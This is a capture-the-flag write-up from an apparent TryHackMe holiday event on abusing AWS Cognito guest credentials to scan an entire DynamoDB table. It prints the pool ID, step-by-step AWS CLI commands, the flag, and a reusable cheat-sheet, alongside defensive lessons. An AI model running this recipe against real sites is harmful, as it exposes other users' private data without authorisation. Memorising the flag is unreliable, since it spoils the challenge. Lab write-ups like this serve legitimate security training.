---
title: "Complimentary — Day #3"
category: Cloud
difficulty: Easy
date: 2026-10-22
event: "TryHackMe Hacker Holidays"
tags: [AWS, Cognito, DynamoDB, CTF]
---

## 1. Summary

- The website is a static site.
- Hosted on **S3**.
- Its JavaScript file contained a hardcoded **AWS Cognito Identity Pool ID**.
  - What is a **Cognito Identity Pool ID**? An Amazon Cognito Identity Pool ID is a unique string identifier (formatted like `us-east-1:xxxxxx-xxxx-...`) that points to a specific authorization container in AWS, letting an app swap user logins for temporary AWS security credentials.
- It was used to give every visitor free, anonymous "guest" AWS credentials (no login required).
- The IAM role attached to these guest credentials was **too permissive** — it allowed a full `Scan` on the backend **DynamoDB table** (`complimentary-GuestWellnessProfiles`) instead of only letting a guest read their own record.

## 2. Reconnaissance

**Step 1 — Visit the site**
Static website, no visible login form, no input fields.

**Step 2 — View page source / JS files**
Found a JavaScript file with this key logic:

```js
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";

AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});
```

The developer's own code comment explained the design:

> "every visitor gets 'free' AWS guest credentials from our Cognito Identity Pool so we can save wellness preferences without the friction of an account."

This confirmed the app relies on **Cognito unauthenticated (guest) identities** for AWS access.

**Step 3 — Understand normal app behavior**
Normally, the app only requests the record matching the visitor's own random `guest_id` (a `localStorage` value). It was never meant to expose other guests' data.

## 3. The Vulnerability

- **Type:** Broken / excessive access control via AWS Cognito Identity Pool (insecure direct cloud resource access).
- **Root cause:** the IAM role attached to Cognito's unauthenticated guest identities granted `dynamodb:Scan` (or overly broad `dynamodb:*`) permissions on the whole table, instead of being scoped to `GetItem` / `Query` on only the caller's own `guest_id`.
- **Why it happened:** the developers trusted the _client-side application logic_ (only requesting your own `guest_id`) to enforce access control. But AWS permissions are enforced server-side by IAM policy — not by what the JavaScript app "intends" to do. Anyone can bypass the app entirely and call AWS APIs directly with the same guest credentials.

## 4. Exploitation — Step by Step

**Step 1: Get an Identity ID from the same public pool**

```bash
aws cognito-identity get-id \
  --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688" \
  --region us-east-1
```

**Step 2: Exchange it for temporary AWS credentials**

```bash
aws cognito-identity get-credentials-for-identity \
  --identity-id "<IdentityId from Step 1>" \
  --region us-east-1
```

This returns `AccessKeyId`, `SecretKey`, and `SessionToken` — valid, working AWS credentials, handed to any anonymous visitor.

**Step 3: Use the credentials**

```bash
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

aws sts get-caller-identity   # confirm identity / permissions
```

**Step 4: Abuse over-permissive access — scan the whole table**

```bash
aws dynamodb scan \
  --table-name complimentary-GuestWellnessProfiles \
  --region us-east-1
```

Instead of returning only my own guest record, this returned **every guest's data** in the table — including the record containing the flag.

## 5. Tools Used

| Tool                                | Purpose                                               | Key takeaway                                                                  |
| ----------------------------------- | ----------------------------------------------------- | ----------------------------------------------------------------------------- |
| Browser DevTools                    | Find hidden JS logic and config values                | Client-side JS often reveals backend architecture (pool IDs, table names)     |
| AWS CLI (`cognito-identity`)        | Request the same guest credentials the app uses       | `get-id` + `get-credentials-for-identity` = anonymous but real AWS access     |
| AWS CLI (`dynamodb`)                | Interact directly with the backend database           | `scan` reads the _entire_ table, bypassing the app's intended per-user filter |
| AWS CLI (`sts get-caller-identity`) | Confirm which identity/role the credentials belong to | Good first check after obtaining any new AWS credentials                      |

## 6. New Concepts Learned

- **Cognito Identity Pools** can hand out real AWS credentials to anonymous users by design ("unauthenticated identities") — a legitimate AWS feature, but dangerous if the attached IAM role is too broad.
- **Client-side access control is not real security.** The app only _asked_ for the user's own data — it never _enforced_ it. Real enforcement has to happen in the IAM policy, server-side, e.g. a `dynamodb:LeadingKeys` condition to restrict each identity to only its own `guest_id`.
- Hardcoded IDs (identity pool IDs, table names) in public JavaScript are not secret — anyone can extract and reuse them.
- `aws sts get-caller-identity` is a great first move after getting any new AWS credentials.

## 7. Lessons / What to Remember Next Time

- Always check public JS files for hardcoded AWS resource identifiers (pool IDs, bucket names, table names, API URLs) — very common in cloud CTFs.
- If a site uses Cognito, try requesting guest/unauthenticated credentials yourself — don't assume a login is required.
- Once you have any AWS credentials, systematically try `sts get-caller-identity`, `s3 ls`, `dynamodb list-tables`, `dynamodb scan` on the guest tables — the goal is usually to see if permissions are broader than intended.
- The real vulnerability class here is **"IAM policy too permissive for anonymous identities"** — a pattern that repeats a lot in AWS-focused CTFs.

## 8. Flag

`THM{fr33_app_fr33_d4t4!}`

## 9. Quick Cheat-Sheet

```bash
# 1. Find Cognito Identity Pool ID in the site's JS files (view-source / Network tab)

# 2. Get an anonymous identity
aws cognito-identity get-id --identity-pool-id "<POOL_ID>" --region <REGION>

# 3. Get temporary credentials for it
aws cognito-identity get-credentials-for-identity --identity-id "<IDENTITY_ID>" --region <REGION>

# 4. Export and test
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity

# 5. Enumerate what you can reach
aws s3 ls
aws dynamodb list-tables --region <REGION>
aws dynamodb scan --table-name <TABLE_NAME> --region <REGION>
```
